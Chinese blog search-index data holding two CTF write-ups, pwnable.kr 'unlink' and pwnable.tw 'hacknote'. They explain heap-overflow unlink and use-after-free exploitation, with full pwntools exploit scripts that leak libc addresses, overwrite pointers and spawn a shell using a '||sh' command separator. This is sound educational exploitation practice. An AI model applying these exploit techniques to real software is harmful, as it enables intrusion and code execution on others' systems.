<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2019-4-6-pwnable.kr-unlink</title>
      <link href="/passages/2019-4-6-pwnable.kr-unlink/"/>
      <url>/passages/2019-4-6-pwnable.kr-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="2019-4-6-pwnable-kr-unlink"><a href="#2019-4-6-pwnable-kr-unlink" class="headerlink" title="2019-4-6-pwnable.kr-unlink"></a>2019-4-6-pwnable.kr-unlink</h1><p>这一题第一眼看过去以为很简单，结果因为对指针的不熟悉导致卡壳了好久。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span><span class="comment">//4 byte</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span><span class="comment">//4 byte</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];<span class="comment">//8 byte</span></span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">OBJ* BK;<span class="comment">//4 byte</span></span><br><span class="line">OBJ* FD;<span class="comment">//4 byte</span></span><br><span class="line">BK=P-&gt;bk;<span class="comment">//4 byte</span></span><br><span class="line">FD=P-&gt;fd;<span class="comment">//4 byte</span></span><br><span class="line">FD-&gt;bk=BK;<span class="comment">//4 byte fd+4=bk</span></span><br><span class="line">BK-&gt;fd=FD;<span class="comment">//4 byte bk=fd</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">A-&gt;fd = B;</span><br><span class="line">B-&gt;bk = A;</span><br><span class="line">B-&gt;fd = C;</span><br><span class="line">C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"here is stack address leak: %p\n"</span>, &amp;A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"here is heap address leak: %p\n"</span>, A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"now that you have leaks, get shell!\n"</span>);</span><br><span class="line"><span class="comment">// heap overflow!</span></span><br><span class="line">gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit this unlink!</span></span><br><span class="line">unlink(B);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序很简单，就是malloc了三个结构体，</p><p>在堆上的抽象结构<br>chunk A size<br>chunk A context（0-3字节存储<em>chunk B，4-7字节为空，+8字节buf）<br>chunk B size<br>chunk B context（头8个字节分别存储着 </em>chunk A、 <em>chunk B，+8字节buf）<br>chunk C size<br>chunk C context（第4-8字节存储着</em>chunk B，+8字节buf）</p><p>实际结构<br><img src="/images/2019-4-6-pwnable-unlink/2019-4-6-16-29.png" alt="avatar"><br>这里有个小问题，可能因为我的kali是64位的，所以在本地的堆是按16位对齐的，而pwnable.kr服务器的堆则是按照8位对齐的，这一点我也是多次失败看别人的题解才发现的，具体原理不懂。</p><p>然后unlink（B），简单来讲就是，让A原本为空的第4-8字节变成C，C原本为空的头四个字节变成A，是一个简化版的模拟unlink<br>B-&gt;fd-&gt;bk=B-&gt;bk<br>B-&gt;bk-&gt;fd=B-&gt;fd</p><p>原本光这样是没什么漏洞的，但因为unlink之前有个gets（A-&gt;buf），gets这个函数的危险性就在于它不会检测边界，可以随意地溢出。<br>通过溢出覆盖B的fd和bk，就可以造成任意地址写入。</p><p>我一开始的想法是让chunk B的fd=shell()函数地址，bk=main函数返回地址，然后发现了一个问题，就是*fd+4位置会被写入bk的值，这样shell函数就被破坏了。</p><p>然后我想到先把shell地址存起来，通过调用这个存放地址来调用shell函数，于是我写了这个payload：’a’*24+p32(heap+0x28)+p32(stack+0x18)+p32(shell_addr)，其中heap、stack是程序自己告诉我们的两个值，heap+0x28是chunkB的buf字段，stack+0x18是存放return地址。</p><p>这里就体现了我对指针的不熟悉，BK=stack+0x18，然后BK-&gt;fd=FD，这个时候return地址就变成了heap+0x28，然而heap+0x28不是shell的地址，而是存储着shell的地址，因为对指针的不熟悉导致我在这里卡了很久<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call    unlink</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></p><p>忍不住看了别人的题解才发现函数返回之前，esp的值会变成[ecx-4]，而[heap+0x28]就是shell()函数地址。retn相当于pop eip，执行retn的时候就会把栈顶的esp赋值给eip，然后实现跳转。<br>所以我们要让ecx-4=shell_addr=heap+0x28，因为ecx=[ebp+var_4]=[ebp-4] (var_4=-4),所以要让ebp-4地址所在的值变成（heap+0x28）+4.<br>这样我们就能构造payload=’a’<em>24+p32(heap+0x28+4)+p32(stack+0x14-4)+p32(shell_addr)或者’a’</em>24+p32(stack+0x14-8)+p32(heap+0x28+4)+p32(shell_addr)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./unlink")</span></span><br><span class="line">p=ssh(user=<span class="string">'unlink'</span>,host=<span class="string">'pwnable.kr'</span>,port=<span class="number">2222</span>,password=<span class="string">'guest'</span>,)</span><br><span class="line"></span><br><span class="line">unlink_addr=<span class="number">0x08048504</span></span><br><span class="line">shell_addr=<span class="number">0x080484eb</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">text=p.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> (text)</span><br><span class="line">stack=int(text[<span class="number">28</span>:<span class="number">38</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"stack:"</span>,stack)</span><br><span class="line">heap=int(text[<span class="number">-46</span>:<span class="number">-37</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"heap:"</span>,heap)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(p32(shell_addr)+'a'*20+p32(stack+12)+p32(heap+12))</span></span><br><span class="line"><span class="comment">#p.sendline('a'*24+p32(stack+12)+p32(heap+0x28+4)+p32(shell_addr))</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">16</span>+p32(stack+<span class="number">12</span>)+p32(heap+<span class="number">0x20</span>+<span class="number">4</span>)+p32(shell_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考题解：<a href="https://www.cnblogs.com/p4nda/p/7172104.html" target="_blank" rel="noopener">https://www.cnblogs.com/p4nda/p/7172104.html</a></p><p>Linux堆溢出漏洞利用之unlink：<br><a href="https://www.cnblogs.com/alisecurity/p/5563819.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5563819.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-4-2-hacknote题解</title>
      <link href="/passages/2019-4-2-hacknote%E9%A2%98%E8%A7%A3/"/>
      <url>/passages/2019-4-2-hacknote%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="pwnabletw-hacknote"><a href="#pwnabletw-hacknote" class="headerlink" title="pwnabletw-hacknote"></a>pwnabletw-hacknote</h1><p>借着这道比较基础的uaf（use after free）的题目回顾一下堆溢出<br>先简单说说一下堆</p><h2 id="堆基础"><a href="#堆基础" class="headerlink" title="堆基础"></a>堆基础</h2><p>可以通过gdb的vmmap查看内存空间<br><img src="/images/2019-4-2-hacknote/2019-4-2-20-53.png" alt="avatar"><br>其中[heap]就是堆空间，堆跟栈不同，堆是沿着地址高位增长的</p><p>堆分配的基本策略就是malloc(size)时系统分配堆大小的必定是比size大或等于的8\16的倍数（32位系统为8的倍数，在64位系统则是16的倍数），并且会有一个8字节的堆头（header），里面记录的堆的信息。（之后会在堆专门的学习笔记里详细展开）<br>（目前在我的学习中，只有malloc及其相似的一类函数会分配堆。）<br>所以在32位系统中，最低能分配的就是16字节的堆块（malloc（0）会返回NULL值，或者实际地址，具体取决于系统）</p><h2 id="uaf基础"><a href="#uaf基础" class="headerlink" title="uaf基础"></a>uaf基础</h2><p>当free堆块时，若是没有将堆块指针置NULL的话，那么就可以通过这个指针重新访问堆块，这时候堆块的内容可能为空，也可能是某个地址，最终导致漏洞出现。利用漏洞的方式就在于操作系统的堆管理方式，当一个堆块free后，并不是还给操作系统，而是放入表(bin)中，linux的堆管理存在着127个bin，不同bin的区别主要在于每个bin链表中存放的堆块（chunk）大小不同，像这道hacknote我们就只需要存放16-80字节的fastbin，当我们再次申请堆块空间时，系统就首先会从这些bin中找到最合适大小的堆块空间给我们。这种机制配合uaf再配合对堆内容的写入就能实现任意地址跳转了。</p><h2 id="hacknote函数解析"><a href="#hacknote函数解析" class="headerlink" title="hacknote函数解析"></a>hacknote函数解析</h2><p><img src="/images/2019-4-2-hacknote/2019-4-2-21-12.png" alt="avatar"><br>这次专注于基础的堆溢出，有用的信息就是该程序是16位<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);<span class="comment">//开启CANARY后会在每个函数多出这个，从汇编上可以看出是在栈低，也就是ebp上方填入一个数字，跟本题无关</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048956();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_80487D4();<span class="comment">//delete函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_80488A5();<span class="comment">//print函数</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      sub_8048646();<span class="comment">//add函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>main函数挺简单的，重点就三个函数，delete、print、add，其中uaf漏洞就存在于delete中，接下来我们看delete函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);<span class="comment">//重点在这，free后没有把指针置null，导致堆块虽然清空了，但是指针还保存着堆栈的地址，从而能访问空的堆栈，另外值得注意的是先free掉ptr[v1]+1指向的地址（字符串context），然后再free ptr[v1]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure><p>知道漏洞是uaf后就要开始考虑怎么利用了,先看看add函数是怎么申请空间的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="keyword">if</span> ( dword_804A04C &lt;= <span class="number">5</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);<span class="comment">//首先申请一个8字节的空间，实际上会分配16字节</span></span><br><span class="line">      <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)ptr[i] = sub_804862B;<span class="comment">//这里是让刚才申请的堆块头部放入指向sub_804862B的指针，这样访问该堆块的时候就会执行这个函数，这个函数的作用就是put，并且参数是堆块本身，之后会用于地址泄露</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">      size = atoi(&amp;buf);</span><br><span class="line">      v0 = ptr[i];</span><br><span class="line">      v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);<span class="comment">//第二次申请堆空间，第一次申请的空间ptr[i]就是v0[0]，第二次申请的空间的指针就会存放到v0[1]中，这样put函数就能输出第二次申请的空间内储存的值了</span></span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)ptr[i] + <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">      read(<span class="number">0</span>, *((<span class="keyword">void</span> **)ptr[i] + <span class="number">1</span>), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">      ++dword_804A04C;</span><br><span class="line">      <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br></pre></td></tr></table></figure><p>这么分析可能还不够直白，上手操作一下<br><img src="/images/2019-4-2-hacknote/2019-4-2-21-44.png" alt="avatar"><br>这是我们要申请的堆块</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-21-47.png" alt="avatar"><br>可以看到在堆块的起始位置0x0804b000偏移0xc的位置有个0x151的偏移，那就是存储着内容的堆的起始地点（为什么和实际index：0的堆块差了15个字节以后再讲），可以看到0x804b160就存储着我们刚申请的堆块，其中0x0804862b就是指向put函数的地址，0x0804b170就是字符串“aaaaaaaaaaaaaaa”的位置，之后会作为put函数的参数。</p><p>让我们来看一下print函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1])(ptr[v1]);<span class="comment">//ptr[v1]就是堆块地址，堆块头存储着put函数的地址，put函数的参数就是ptr[v1]，也就是它本身。</span></span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure></p><p>再看看puts函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br></pre></td></tr></table></figure></p><p>可以看到put会输出a1+4，也就是ptr[v1]+4，那个位置存储着字符串的地址</p><h2 id="hacknote题解"><a href="#hacknote题解" class="headerlink" title="hacknote题解"></a>hacknote题解</h2><p>分析完函数，弄懂整个程序后开始构造脚本了，首先我们要想办法泄露地址，因此要在第一次申请的堆栈内写入我们需要的地址，比如read()，然后用得到的read()函数实际地址减去libc中read的偏移量，得到程序加载libc的基址，再用这个基址加上system的偏移量，得到system函数在程序实际执行时的地址，最后再写入一次system的地址和字符串“sh”，执行后得到shell</p><p>想要往第一次申请的堆块中写入内容，就要利用到fastbin的特性，free后的堆块会放到fastbin链表的表尾，在之后申请同样大小的堆块时会先分配表尾的空间。所以我们先add两次，输入的context size等于16（这里只要大于8就行，也就是不要让两个context和ptr[0]free后在一个链表就行），然后都free掉（delete index0和index1），这时index0[0]在fastbin的16字节链表的表头，index1[0]在表尾，至于两个context则在fastbin的32字节链表。<br>当我们再add一个context size为8的index2时，index2[0]的16字节空间会利用fastbin16字节链表表尾的index1[0]，而context申请的16字节空间就在index0[0]的位置，这时候我们输入的context就会把index0的头部修改了。</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-22-25.png" alt="avatar"><br>可以看到我们add两次后的堆空间内容，这里我申请的context size为16，所以它给我对齐成了32字节（这里有点困惑，按理来说32位系统应该分配给我24字节的空间，delete后之后我尝试申请24字节的空间，给我的也是原本那片空间，可见的确是分配了32字节）</p><p><img src="/images/2019-4-2-hacknote/2019-4-2-22-29.png" alt="avatar"><br>当我分别delete index0和index1然后申请了size=8的index2后<br>堆空间变了，原本index0[0]的空间内容变成了我输入的字符串“cccccccc”<br>然后就可以写我们的脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./hacknote"</span>)</span><br><span class="line"><span class="comment">#libc=ELF('./libc_32.so.6',checksec=False)</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">//ldd hacknote得到在本机使用的库</span><br><span class="line">elf=ELF(<span class="string">'./hacknote'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">read_libc=libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_symbol=elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"16"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,<span class="string">"a"</span>*<span class="number">15</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"16"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,<span class="string">"a"</span>*<span class="number">15</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"8"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,p32(<span class="number">0x0804862b</span>)+p32(read_got))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"0"</span>)</span><br><span class="line">a=p.recv()</span><br><span class="line">read_addr=u32(a[:<span class="number">4</span>])</span><br><span class="line">print(<span class="string">"a--------------"</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">"base_addr---------------"</span>)</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">base_addr=read_addr-read_libc</span><br><span class="line">system_addr=system_libc+base_addr</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,<span class="string">"8"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Content :"</span>,p32(system_addr)+<span class="string">"||sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里比较特别的就是system的参数要用到截断字符，因为之前print函数里是(<em>(void (__cdecl **)(void </em>))ptr[v1])(ptr[v1]);这样调用堆块头指向的函数的，所以我们的system的参数实际上是p32(system_addr)+”sh”，也就是system（p32(system_addr)+”sh”）,这样显然不能实现system（”sh”）,所以就要用到截断字符”||”或者”;”了，<br>system(“hsasoijiojo||sh”)就等于system(“sh”)<br>另外system(“sh”)=system(“/bin/sh”)，两者效果是一样的。</p><p>参考链接：<a href="https://www.jianshu.com/p/12c7d96e0bd3" target="_blank" rel="noopener">https://www.jianshu.com/p/12c7d96e0bd3</a><br><a href="https://www.anquanke.com/post/id/150359#h2-24" target="_blank" 